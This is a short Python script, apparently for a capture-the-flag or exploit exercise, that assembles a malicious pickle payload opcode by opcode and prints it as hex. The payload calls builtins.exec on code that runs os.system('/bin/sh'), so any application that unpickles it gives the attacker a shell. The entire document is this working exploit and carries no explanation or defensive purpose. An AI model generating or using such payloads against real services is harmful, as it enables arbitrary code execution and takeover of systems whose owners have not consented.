from pickle import *

p = b""

p += PROTO
p += b'\x05'
p += GLOBAL
p += b'builtins\n'
p += b'exec\n'
p += STRING
p += b'"__import__(\'os\').system(\'/bin/sh\')"\n'
p += TUPLE1
p += REDUCE
p += STOP

print(p.hex())
